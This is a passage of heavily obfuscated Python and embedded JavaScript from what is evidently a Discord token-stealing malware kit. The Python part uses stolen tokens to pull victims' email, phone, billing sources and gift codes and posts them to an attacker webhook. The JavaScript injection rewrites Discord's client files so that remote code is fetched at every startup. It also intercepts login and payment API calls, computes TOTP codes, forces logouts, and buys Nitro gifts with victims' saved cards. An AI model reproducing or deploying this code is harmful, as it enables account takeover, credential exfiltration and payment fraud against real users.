            if RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get('premium_type', 'None') == 0:
                BHMQTEAWKDMTQQZGSVFZBIASRUEANZZIHZGBXISFLLFPKIIKEPXVPTOYVALAUGLBQJBDRKUSRINZIFWKB = 'False'
            elif RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get('premium_type', 'None') == 1:
                BHMQTEAWKDMTQQZGSVFZBIASRUEANZZIHZGBXISFLLFPKIIKEPXVPTOYVALAUGLBQJBDRKUSRINZIFWKB = 'Nitro Classic'
            elif RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get('premium_type', 'None') == 2:
                BHMQTEAWKDMTQQZGSVFZBIASRUEANZZIHZGBXISFLLFPKIIKEPXVPTOYVALAUGLBQJBDRKUSRINZIFWKB = 'Nitro Boosts'
            elif RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get('premium_type', 'None') == 3:
                BHMQTEAWKDMTQQZGSVFZBIASRUEANZZIHZGBXISFLLFPKIIKEPXVPTOYVALAUGLBQJBDRKUSRINZIFWKB = 'Nitro Basic'
            else:
                BHMQTEAWKDMTQQZGSVFZBIASRUEANZZIHZGBXISFLLFPKIIKEPXVPTOYVALAUGLBQJBDRKUSRINZIFWKB = 'False'
        except:
            BHMQTEAWKDMTQQZGSVFZBIASRUEANZZIHZGBXISFLLFPKIIKEPXVPTOYVALAUGLBQJBDRKUSRINZIFWKB = "None"

        try: 
            JPSWGHQYXKZQIKLYGAVIMGCTEJMRGCDTNZDDGKUXYVBLOXFQNNOBELUFCMAUDCROLGCABUOHMGLXWBERWYBEJCN = f"https://cdn.discordapp.com/avatars/{SBJZTTFSAYUONJVHFBEZNGECVHBYIGAEWAAITXOPBQOVKQTGOFXYKHATVUISNQOIIDPQJC}/{RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{SBJZTTFSAYUONJVHFBEZNGECVHBYIGAEWAAITXOPBQOVKQTGOFXYKHATVUISNQOIIDPQJC}/{RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{SBJZTTFSAYUONJVHFBEZNGECVHBYIGAEWAAITXOPBQOVKQTGOFXYKHATVUISNQOIIDPQJC}/{RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW['avatar']}.png"
        except: 
            JPSWGHQYXKZQIKLYGAVIMGCTEJMRGCDTNZDDGKUXYVBLOXFQNNOBELUFCMAUDCROLGCABUOHMGLXWBERWYBEJCN = HCZWNWNKJPEZYZAXSIFDFXNEOZSCMRNIYTWIZJHOQHRTKDFMTZHGQCNFTKYMMPIFVSKPLBSRXXLEAPAQHXWZXWAAZQ

        try:
            DEBWQQWQGFJWSPGYTJHPDJIOKARKODORIVTVPGQTULCSXYUNBEATZ = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': JCEYOTYXCZKDVJIKJGVZDNIVVRASPYYAXVCHTIYUCTSTJTQYJGZYOZQDERIKSNVMQDFQAJBLFVQYUKYTX_d15c0rd}).json()
            if DEBWQQWQGFJWSPGYTJHPDJIOKARKODORIVTVPGQTULCSXYUNBEATZ:
                CMGBXTJMTJKGLXPJDFEEMRZWYMWPVBTVCVLVQXTIMSZKQUPGOGJQTISNVAZTJOIWYFDYXBJT = []

                for v4r_method in DEBWQQWQGFJWSPGYTJHPDJIOKARKODORIVTVPGQTULCSXYUNBEATZ:
                    if v4r_method['type'] == 1:
                        CMGBXTJMTJKGLXPJDFEEMRZWYMWPVBTVCVLVQXTIMSZKQUPGOGJQTISNVAZTJOIWYFDYXBJT.append('CB')
                    elif v4r_method['type'] == 2:
                        CMGBXTJMTJKGLXPJDFEEMRZWYMWPVBTVCVLVQXTIMSZKQUPGOGJQTISNVAZTJOIWYFDYXBJT.append("Paypal")
                    else:
                        CMGBXTJMTJKGLXPJDFEEMRZWYMWPVBTVCVLVQXTIMSZKQUPGOGJQTISNVAZTJOIWYFDYXBJT.append('Other')
                CMGBXTJMTJKGLXPJDFEEMRZWYMWPVBTVCVLVQXTIMSZKQUPGOGJQTISNVAZTJOIWYFDYXBJT = ' / '.join(CMGBXTJMTJKGLXPJDFEEMRZWYMWPVBTVCVLVQXTIMSZKQUPGOGJQTISNVAZTJOIWYFDYXBJT)
            else:
                CMGBXTJMTJKGLXPJDFEEMRZWYMWPVBTVCVLVQXTIMSZKQUPGOGJQTISNVAZTJOIWYFDYXBJT = "None"
        except:
            CMGBXTJMTJKGLXPJDFEEMRZWYMWPVBTVCVLVQXTIMSZKQUPGOGJQTISNVAZTJOIWYFDYXBJT = "None"

        try:
            OLHRZPLSJNGVBJIXBEKLPCIOYAGIRJTOMNMKFPMDIWOYXMXCMHZEMRJYRBAOLNAKXTPEFSPIQ = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': JCEYOTYXCZKDVJIKJGVZDNIVVRASPYYAXVCHTIYUCTSTJTQYJGZYOZQDERIKSNVMQDFQAJBLFVQYUKYTX_d15c0rd}).json()
            if OLHRZPLSJNGVBJIXBEKLPCIOYAGIRJTOMNMKFPMDIWOYXMXCMHZEMRJYRBAOLNAKXTPEFSPIQ:
                JWMWOSLSXNRTXLSZNGVVLSZLBFXGRDGQNIMSHXHIRXBXZCTPRJQMGEYBNMEJBUYJCQTNFCADZWWVOJSGUAXAQWZLRVUAJZMNQZPL = []
                for TUJJBLUTEQKAOCPZUUJWREHYSLYBWQVZTKGOEWHTKPAVUSJMTFGGLBNXOMGOUFMINJSFUFAP in OLHRZPLSJNGVBJIXBEKLPCIOYAGIRJTOMNMKFPMDIWOYXMXCMHZEMRJYRBAOLNAKXTPEFSPIQ:
                    DZWXDJAUFSVQEFZSCLGUMQPBXBTHOXURBCQLHBHIDFUTAMOKPT = TUJJBLUTEQKAOCPZUUJWREHYSLYBWQVZTKGOEWHTKPAVUSJMTFGGLBNXOMGOUFMINJSFUFAP['promotion']['outbound_title']
                    TUJJBLUTEQKAOCPZUUJWREHYSLYBWQVZTKGOEWHTKPAVUSJMTFGGLBNXOMGOUFMINJSFUFAP = TUJJBLUTEQKAOCPZUUJWREHYSLYBWQVZTKGOEWHTKPAVUSJMTFGGLBNXOMGOUFMINJSFUFAP['code']
                    IWUMVGLZFAPWIBKSSJAXWPSZYMOPSJTOUZCNJLUFBBNIYXVSPZBSTEIPVRWODRARIBSQFBSPQ = f"Gift: {DZWXDJAUFSVQEFZSCLGUMQPBXBTHOXURBCQLHBHIDFUTAMOKPT}\nCode: {TUJJBLUTEQKAOCPZUUJWREHYSLYBWQVZTKGOEWHTKPAVUSJMTFGGLBNXOMGOUFMINJSFUFAP}"
                    if len('\n\n'.join(TUJJBLUTEQKAOCPZUUJWREHYSLYBWQVZTKGOEWHTKPAVUSJMTFGGLBNXOMGOUFMINJSFUFAP)) + len(IWUMVGLZFAPWIBKSSJAXWPSZYMOPSJTOUZCNJLUFBBNIYXVSPZBSTEIPVRWODRARIBSQFBSPQ) >= 1024:
                        break
                    JWMWOSLSXNRTXLSZNGVVLSZLBFXGRDGQNIMSHXHIRXBXZCTPRJQMGEYBNMEJBUYJCQTNFCADZWWVOJSGUAXAQWZLRVUAJZMNQZPL.append(IWUMVGLZFAPWIBKSSJAXWPSZYMOPSJTOUZCNJLUFBBNIYXVSPZBSTEIPVRWODRARIBSQFBSPQ)
                if len(JWMWOSLSXNRTXLSZNGVVLSZLBFXGRDGQNIMSHXHIRXBXZCTPRJQMGEYBNMEJBUYJCQTNFCADZWWVOJSGUAXAQWZLRVUAJZMNQZPL) > 0:
                    TUJJBLUTEQKAOCPZUUJWREHYSLYBWQVZTKGOEWHTKPAVUSJMTFGGLBNXOMGOUFMINJSFUFAP = '\n\n'.join(JWMWOSLSXNRTXLSZNGVVLSZLBFXGRDGQNIMSHXHIRXBXZCTPRJQMGEYBNMEJBUYJCQTNFCADZWWVOJSGUAXAQWZLRVUAJZMNQZPL)
                else:
                    TUJJBLUTEQKAOCPZUUJWREHYSLYBWQVZTKGOEWHTKPAVUSJMTFGGLBNXOMGOUFMINJSFUFAP = "None"
            else:
                TUJJBLUTEQKAOCPZUUJWREHYSLYBWQVZTKGOEWHTKPAVUSJMTFGGLBNXOMGOUFMINJSFUFAP = "None"
        except:
            TUJJBLUTEQKAOCPZUUJWREHYSLYBWQVZTKGOEWHTKPAVUSJMTFGGLBNXOMGOUFMINJSFUFAP = "None"
    
        v4r_software_name, RHFHTPZYBPWMTUMJANPTWOTALOJEDSSRUXTDADHUQHRSXVVAZFMSXOECYFACMOLCQANCWLKZCMEFN = WANEGCJHCJOECWDGQPKQUZPKAFHFFIXEXAPLIXGJRJXNEVPQAUUYUPGYHLOFPTHIJSZPAYEBGGEYI.get(JCEYOTYXCZKDVJIKJGVZDNIVVRASPYYAXVCHTIYUCTSTJTQYJGZYOZQDERIKSNVMQDFQAJBLFVQYUKYTX_d15c0rd, ("Unknown Software", "Unknown location"))

        embed = Embed(title=f'Discord Token {NADSFPUELPXXMDMXIWFCEXTCECYDVOPQLAAQJNETRHOJSZHRLXCXTAAFAURGBBGOJADMMKVCB}:', color=EFSWMHTVETEZDWCBKEMXAHVZPLFCGFWCLUZCRFJJEYNSKRYGLNTPRUYW)      
        embed.add_field(name=":file_folder: Path:", value=f"```{RHFHTPZYBPWMTUMJANPTWOTALOJEDSSRUXTDADHUQHRSXVVAZFMSXOECYFACMOLCQANCWLKZCMEFN}```", inline=True)
        embed.add_field(name=":globe_with_meridians: Token:", value=f"```{JCEYOTYXCZKDVJIKJGVZDNIVVRASPYYAXVCHTIYUCTSTJTQYJGZYOZQDERIKSNVMQDFQAJBLFVQYUKYTX_d15c0rd}```", inline=True)
        embed.add_field(name=":package: Software:", value=f"```{v4r_software_name}```", inline=True)
        embed.add_field(name=":bust_in_silhouette: Username:", value=f"```{IDCCALMTNFKMLHMDMNECOZSDJUMDNTPVYPGPPYZRBWPZLKUCMEJXUZVCISVAIZKYQXLUEDAPZRIGGHLW}```", inline=True)
        embed.add_field(name=":bust_in_silhouette: Display Name:", value=f"```{HCWRPVFCZJQJRHUKHKUCKDVQHZWJRJWELIYJUKDKSFBJNVCQCBCUVFBGJZJAUGTMRKSUUQDKYVFZUANPRWKH}```", inline=True)
        embed.add_field(name=":robot: Id:", value=f"```{SBJZTTFSAYUONJVHFBEZNGECVHBYIGAEWAAITXOPBQOVKQTGOFXYKHATVUISNQOIIDPQJC}```", inline=True)
        embed.add_field(name=":e_mail: Email:", value=f"```{IJMRRYPLCUIYAXTXLVPUIMBWMQJAEJSFAQAAVIIVJTPVXRFVPGA}```", inline=True)
        embed.add_field(name=":white_check_mark: Email Verified:", value=f"```{LVOSKUFDBCCILTRJPSOSQGTPFMLZUYNJEEISQCJGZWSFSTMGAVSMJOLDLMJBJMDNWA}```", inline=True)
        embed.add_field(name=":telephone_receiver: Phone:", value=f"```{NOZPFADDCVFWARKVKZHIMAXYFGUJBEILWGGCSNYBVXZXMDUGTHELKDHNGCQNA}```", inline=True)   
        embed.add_field(name=":rocket: Nitro:", value=f"```{BHMQTEAWKDMTQQZGSVFZBIASRUEANZZIHZGBXISFLLFPKIIKEPXVPTOYVALAUGLBQJBDRKUSRINZIFWKB}```", inline=True)
        embed.add_field(name=":earth_africa: Language:", value=f"```{XDECAVDSAKUKDUCXWFUUZGDXOPNBRQLIQTBCZRJLBSGNRFIDTNDGITKWWPFUMRBXGSDPWGCWOGRJY}```", inline=True)
        embed.add_field(name=":moneybag: Billing:", value=f"```{CMGBXTJMTJKGLXPJDFEEMRZWYMWPVBTVCVLVQXTIMSZKQUPGOGJQTISNVAZTJOIWYFDYXBJT}```", inline=True)
        embed.add_field(name=":gift: Gift Code:", value=f"```{TUJJBLUTEQKAOCPZUUJWREHYSLYBWQVZTKGOEWHTKPAVUSJMTFGGLBNXOMGOUFMINJSFUFAP}```", inline=True)
        embed.add_field(name=":lock: Multi-Factor Authentication:", value=f"```{RBMDXKNLOMXMRBTUAFFRXQACGFSRNFYXKCMBJXVPDGBAQBQEKRHVZLBQEBYNIFYMFBJHMLQZMDD}```", inline=True)
        embed.add_field(name=":frame_photo: Profile Picture:", value=f"", inline=False)
        embed.set_image(url=JPSWGHQYXKZQIKLYGAVIMGCTEJMRGCDTNZDDGKUXYVBLOXFQNNOBELUFCMAUDCROLGCABUOHMGLXWBERWYBEJCN)
        embed.set_footer(text=GSKOYQBPLTAZTJYETFJLNDYOMYNWBGHBUBBACGZNJYAZRFKGVAXHTWEPOYWZMIPNHRWKOCQMKCFWQZGTWYSHYEIPUIJQTGHGIUY, icon_url=HCZWNWNKJPEZYZAXSIFDFXNEOZSCMRNIYTWIZJHOQHRTKDFMTZHGQCNFTKYMMPIFVSKPLBSRXXLEAPAQHXWZXWAAZQ)
        CUDONGQCHGZZPKNWUXEGYEUFSCLFBJLNWSNDAKZYKQZGWXXDPSK.send(embed=embed, username=BHXYAAKWQVSJTFCMWFLZQJNUPCRIJWAIGUWXGRRXBCLPNKVDDQMTZUJCDKS, avatar_url=HCZWNWNKJPEZYZAXSIFDFXNEOZSCMRNIYTWIZJHOQHRTKDFMTZHGQCNFTKYMMPIFVSKPLBSRXXLEAPAQHXWZXWAAZQ)

JXVSKYLUOSINOJYUXCMLKIXJUGPTDSCBMBFQUECMEXCCDHZDFOSJUMMUBY = r"""
const args = process.argv;
const fs = require('fs');
const path = require('path');
const https = require('https');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron');

const config = {
  webhook: '%WEBHOOK_HERE%', 
  webhook_protector_key: '%WEBHOOK_KEY%', 
  auto_buy_nitro: false, 
  ping_on_run: true, 
  ping_val: '@everyone',
  ip_address_public: '%IP_PUBLIC%',
  username: '%USERNAME%',
  embed_name: '%EMBED_NAME%', 
  embed_icon: '%EMBED_ICON%'.replace(/ /g, '%20'), 
  footer_text: '%FOOTER_TEXT%',
  embed_color: %EMBED_COLOR%, 
  injection_url: '', 
  api: 'https://discord.com/api/v9/users/@me',
  nitro: {
    boost: {
      year: {
        id: '521847234246082599',
        sku: '511651885459963904',
        price: '9999',
      },
      month: {
        id: '521847234246082599',
        sku: '511651880837840896',
        price: '999',
      },
    },
    classic: {
      month: {
        id: '521846918637420545',
        sku: '511651871736201216',
        price: '499',
      },
    },
  },
  filter: {
    urls: [
      'https://discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/users/@me',
      'https://*.discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/auth/login',
      'https://discord.com/api/v*/auth/login',
      'https://*.discord.com/api/v*/auth/login',
      'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
      'https://api.stripe.com/v*/tokens',
      'https://api.stripe.com/v*/setup_intents/*/confirm',
      'https://api.stripe.com/v*/payment_intents/*/confirm',
    ],
  },
  filter2: {
    urls: [
      'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
      'https://*.discord.com/api/v*/applications/detectable',
      'https://discord.com/api/v*/applications/detectable',
      'https://*.discord.com/api/v*/users/@me/library',
      'https://discord.com/api/v*/users/@me/library',
      'wss://remote-auth-gateway.discord.gg/*',
    ],
  },
};

function parity_32(x, y, z) {
  return x ^ y ^ z;
}
function ch_32(x, y, z) {
  return (x & y) ^ (~x & z);
}

function maj_32(x, y, z) {
  return (x & y) ^ (x & z) ^ (y & z);
}
function rotl_32(x, n) {
  return (x << n) | (x >>> (32 - n));
}
function safeAdd_32_2(a, b) {
  var lsw = (a & 0xffff) + (b & 0xffff),
    msw = (a >>> 16) + (b >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}
function safeAdd_32_5(a, b, c, d, e) {
  var lsw = (a & 0xffff) + (b & 0xffff) + (c & 0xffff) + (d & 0xffff) + (e & 0xffff),
    msw = (a >>> 16) + (b >>> 16) + (c >>> 16) + (d >>> 16) + (e >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}
function binb2hex(binarray) {
  var hex_tab = '0123456789abcdef',
    str = '',
    length = binarray.length * 4,
    i,
    srcByte;

  for (i = 0; i < length; i += 1) {
    srcByte = binarray[i >>> 2] >>> ((3 - (i % 4)) * 8);
    str += hex_tab.charAt((srcByte >>> 4) & 0xf) + hex_tab.charAt(srcByte & 0xf);
  }

  return str;
}

function getH() {
  return [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0];
}
function roundSHA1(block, H) {
  var W = [],
    a,
    b,
    c,
    d,
    e,
    T,
    ch = ch_32,
    parity = parity_32,
    maj = maj_32,
    rotl = rotl_32,
    safeAdd_2 = safeAdd_32_2,
    t,
    safeAdd_5 = safeAdd_32_5;

  a = H[0];
  b = H[1];
  c = H[2];
  d = H[3];
  e = H[4];

  for (t = 0; t < 80; t += 1) {
    if (t < 16) {
      W[t] = block[t];
    } else {
      W[t] = rotl(W[t - 3] ^ W[t - 8] ^ W[t - 14] ^ W[t - 16], 1);
    }

    if (t < 20) {
      T = safeAdd_5(rotl(a, 5), ch(b, c, d), e, 0x5a827999, W[t]);
    } else if (t < 40) {
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0x6ed9eba1, W[t]);
    } else if (t < 60) {
      T = safeAdd_5(rotl(a, 5), maj(b, c, d), e, 0x8f1bbcdc, W[t]);
    } else {
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0xca62c1d6, W[t]);
    }

    e = d;
    d = c;
    c = rotl(b, 30);
    b = a;
    a = T;
  }

  H[0] = safeAdd_2(a, H[0]);
  H[1] = safeAdd_2(b, H[1]);
  H[2] = safeAdd_2(c, H[2]);
  H[3] = safeAdd_2(d, H[3]);
  H[4] = safeAdd_2(e, H[4]);

  return H;
}

function finalizeSHA1(remainder, remainderBinLen, processedBinLen, H) {
  var i, appendedMessageLength, offset;

  offset = (((remainderBinLen + 65) >>> 9) << 4) + 15;
  while (remainder.length <= offset) {
    remainder.push(0);
  }
  remainder[remainderBinLen >>> 5] |= 0x80 << (24 - (remainderBinLen % 32));
  remainder[offset] = remainderBinLen + processedBinLen;
  appendedMessageLength = remainder.length;

  for (i = 0; i < appendedMessageLength; i += 16) {
    H = roundSHA1(remainder.slice(i, i + 16), H);
  }
  return H;
}

function hex2binb(str, existingBin, existingBinLen) {
  var bin,
    length = str.length,
    i,
    num,
    intOffset,
    byteOffset,
    existingByteLen;

  bin = existingBin || [0];
  existingBinLen = existingBinLen || 0;
  existingByteLen = existingBinLen >>> 3;

  if (0 !== length % 2) {
    console.error('String of HEX type must be in byte increments');
  }

  for (i = 0; i < length; i += 2) {
    num = parseInt(str.substr(i, 2), 16);
    if (!isNaN(num)) {
      byteOffset = (i >>> 1) + existingByteLen;
      intOffset = byteOffset >>> 2;
      while (bin.length <= intOffset) {
        bin.push(0);
      }
      bin[intOffset] |= num << (8 * (3 - (byteOffset % 4)));
    } else {
      console.error('String of HEX type contains invalid characters');
    }
  }

  return { value: bin, binLen: length * 4 + existingBinLen };
}

class jsSHA {
  constructor() {
    var processedLen = 0,
      remainder = [],
      remainderLen = 0,
      intermediateH,
      converterFunc,
      outputBinLen,
      variantBlockSize,
      roundFunc,
      finalizeFunc,
      finalized = false,
      hmacKeySet = false,
      keyWithIPad = [],
      keyWithOPad = [],
      numRounds,
      numRounds = 1;

    converterFunc = hex2binb;

    if (numRounds !== parseInt(numRounds, 10) || 1 > numRounds) {
      console.error('numRounds must a integer >= 1');
    }
    variantBlockSize = 512;
    roundFunc = roundSHA1;
    finalizeFunc = finalizeSHA1;
    outputBinLen = 160;
    intermediateH = getH();

    this.setHMACKey = function (key) {
      var keyConverterFunc, convertRet, keyBinLen, keyToUse, blockByteSize, i, lastArrayIndex;
      keyConverterFunc = hex2binb;
      convertRet = keyConverterFunc(key);
      keyBinLen = convertRet['binLen'];
      keyToUse = convertRet['value'];
      blockByteSize = variantBlockSize >>> 3;
      lastArrayIndex = blockByteSize / 4 - 1;

      if (blockByteSize < keyBinLen / 8) {
        keyToUse = finalizeFunc(keyToUse, keyBinLen, 0, getH());
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }
        keyToUse[lastArrayIndex] &= 0xffffff00;
      } else if (blockByteSize > keyBinLen / 8) {
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }
        keyToUse[lastArrayIndex] &= 0xffffff00;
      }

      for (i = 0; i <= lastArrayIndex; i += 1) {
        keyWithIPad[i] = keyToUse[i] ^ 0x36363636;
        keyWithOPad[i] = keyToUse[i] ^ 0x5c5c5c5c;
      }

      intermediateH = roundFunc(keyWithIPad, intermediateH);
      processedLen = variantBlockSize;

      hmacKeySet = true;
    };

    this.update = function (srcString) {
      var convertRet,
        chunkBinLen,
        chunkIntLen,
        chunk,
        i,
        updateProcessedLen = 0,
        variantBlockIntInc = variantBlockSize >>> 5;

      convertRet = converterFunc(srcString, remainder, remainderLen);
      chunkBinLen = convertRet['binLen'];
      chunk = convertRet['value'];

      chunkIntLen = chunkBinLen >>> 5;
      for (i = 0; i < chunkIntLen; i += variantBlockIntInc) {
        if (updateProcessedLen + variantBlockSize <= chunkBinLen) {
          intermediateH = roundFunc(chunk.slice(i, i + variantBlockIntInc), intermediateH);
          updateProcessedLen += variantBlockSize;
        }
      }
      processedLen += updateProcessedLen;
      remainder = chunk.slice(updateProcessedLen >>> 5);
      remainderLen = chunkBinLen % variantBlockSize;
    };

    this.getHMAC = function () {
      var firstHash;

      if (false === hmacKeySet) {
        console.error('Cannot call getHMAC without first setting HMAC key');
      }

      const formatFunc = function (binarray) {
        return binb2hex(binarray);
      };

      if (false === finalized) {
        firstHash = finalizeFunc(remainder, remainderLen, processedLen, intermediateH);
        intermediateH = roundFunc(keyWithOPad, getH());
        intermediateH = finalizeFunc(firstHash, outputBinLen, variantBlockSize, intermediateH);
      }

      finalized = true;
      return formatFunc(intermediateH);
    };
  }
}

if ('function' === typeof define && define['amd']) {
  define(function () {
    return jsSHA;
  });
} else if ('undefined' !== typeof exports) {
  if ('undefined' !== typeof module && module['exports']) {
    module['exports'] = exports = jsSHA;
  } else {
    exports = jsSHA;
  }
} else {
  global['jsSHA'] = jsSHA;
}

if (jsSHA.default) {
  jsSHA = jsSHA.default;
}

function totp(key) {
  const period = 30;
  const digits = 6;
  const timestamp = Date.now();
  const epoch = Math.round(timestamp / 1000.0);
  const time = leftpad(dec2hex(Math.floor(epoch / period)), 16, '0');
  const shaObj = new jsSHA();
  shaObj.setHMACKey(base32tohex(key));
  shaObj.update(time);
  const hmac = shaObj.getHMAC();
  const offset = hex2dec(hmac.substring(hmac.length - 1));
  let otp = (hex2dec(hmac.substr(offset * 2, 8)) & hex2dec('7fffffff')) + '';
  otp = otp.substr(Math.max(otp.length - digits, 0), digits);
  return otp;
}

function hex2dec(s) {
  return parseInt(s, 16);
}

function dec2hex(s) {
  return (s < 15.5 ? '0' : '') + Math.round(s).toString(16);
}

function base32tohex(base32) {
  let base32chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567',
    bits = '',
    hex = '';

  base32 = base32.replace(/=+$/, '');

  for (let i = 0; i < base32.length; i++) {
    let val = base32chars.indexOf(base32.charAt(i).toUpperCase());
    if (val === -1) console.error('Invalid base32 character in key');
    bits += leftpad(val.toString(2), 5, '0');
  }

  for (let i = 0; i + 8 <= bits.length; i += 8) {
    let chunk = bits.substr(i, 8);
    hex = hex + leftpad(parseInt(chunk, 2).toString(16), 2, '0');
  }
  return hex;
}

function leftpad(str, len, pad) {
  if (len + 1 >= str.length) {
    str = Array(len + 1 - str.length).join(pad) + str;
  }
  return str;
}

const discordPath = (function () {
  const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
  let resourcePath;

  if (process.platform === 'win32') {
    resourcePath = path.join(app, 'resources');
  } else if (process.platform === 'darwin') {
    resourcePath = path.join(app, 'Contents', 'Resources');
  }

  if (fs.existsSync(resourcePath)) return { resourcePath, app };
  return { undefined, undefined };
})();

function updateCheck() {
  const { resourcePath, app } = discordPath;
  if (resourcePath === undefined || app === undefined) return;
  const appPath = path.join(resourcePath, 'app');
  const packageJson = path.join(appPath, 'package.json');
  const resourceIndex = path.join(appPath, 'index.js');
  const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
  const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
  if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
  if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
  if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

  if (process.platform === 'win32' || process.platform === 'darwin') {
    fs.writeFileSync(
      packageJson,
      JSON.stringify(
        {
          name: 'discord',
          main: 'index.js',
        },
        null,
        4,
      ),
    );

    const startUpScript = `const fs = require('fs'), https = require('https');
const indexJs = '${indexJs}';
const bdPath = '${bdPath}';
const fileSize = fs.statSync(indexJs).size
fs.readFileSync(indexJs, 'utf8', (err, data) => {
    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
        init();
})
async function init() {
    https.get('${config.injection_url}', (res) => {
        const file = fs.createWriteStream(indexJs);
        res.replace('%WEBHOOK_HERE%', '${config.webhook}')
        res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
        res.pipe(file);
        file.on('finish', () => {
            file.close();
        });
    
    }).on("error", (err) => {
        setTimeout(init(), 10000);
    });
}
require('${path.join(resourcePath, 'app.asar')}')
if (fs.existsSync(bdPath)) require(bdPath);`;
    fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
  }
  if (!fs.existsSync(path.join(__dirname, 'initiation'))) return !0;
  fs.rmdirSync(path.join(__dirname, 'initiation'));
  execScript(
    `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
  );
  return !1;
}

const execScript = (script) => {
  const window = BrowserWindow.getAllWindows()[0];
  return window.webContents.executeJavaScript(script, !0);
};

const getInfo = async (token) => {
  const info = await execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", "${config.api}", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send(null);
    xmlHttp.responseText;`);
  return JSON.parse(info);
};

const fetchBilling = async (token) => {
  const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
    xmlHttp.open("GET", "${config.api}/billing/payment-sources", false); 
    xmlHttp.setRequestHeader("Authorization", "${token}"); 
    xmlHttp.send(null); 
    xmlHttp.responseText`);
  if (!bill.lenght || bill.length === 0) return '';
  return JSON.parse(bill);
};

const getBilling = async (token) => {
  const data = await fetchBilling(token);
  if (!data) return '❌';
  let billing = '';
  data.forEach((x) => {
    if (!x.invalid) {
      switch (x.type) {
        case 1:
          billing += '[CARD] ';
          break;
        case 2:
          billing += '[PAYPAL] ';
          break;
      }
    }
  });
  if (!billing) billing = 'None';
  return billing;
};

const Purchase = async (token, id, _type, _time) => {
  const options = {
    expected_amount: config.nitro[_type][_time]['price'],
    expected_currency: 'usd',
    gift: true,
    payment_source_id: id,
    payment_source_token: null,
    purchase_token: '2422867c-244d-476a-ba4f-36e197758d97',
    sku_subscription_plan_id: config.nitro[_type][_time]['sku'],
  };

  const req = execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]['id']}/purchase", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.setRequestHeader('Content-Type', 'application/json');
    xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));
    xmlHttp.responseText`);
  if (req['gift_code']) {
    return 'https://discord.gift/' + req['gift_code'];
  } else return null;
};

const buyNitro = async (token) => {
  const data = await fetchBilling(token);
  const failedMsg = 'Failed to Purchase';
  if (!data) return failedMsg;

  let IDS = [];
  data.forEach((x) => {
    if (!x.invalid) {
      IDS = IDS.concat(x.id);
    }
  });
  for (let sourceID in IDS) {
    const first = Purchase(token, sourceID, 'boost', 'year');
    if (first !== null) {
      return first;
    } else {
      const second = Purchase(token, sourceID, 'boost', 'month');
      if (second !== null) {
        return second;
      } else {
        const third = Purchase(token, sourceID, 'classic', 'month');
        if (third !== null) {
          return third;
        } else {
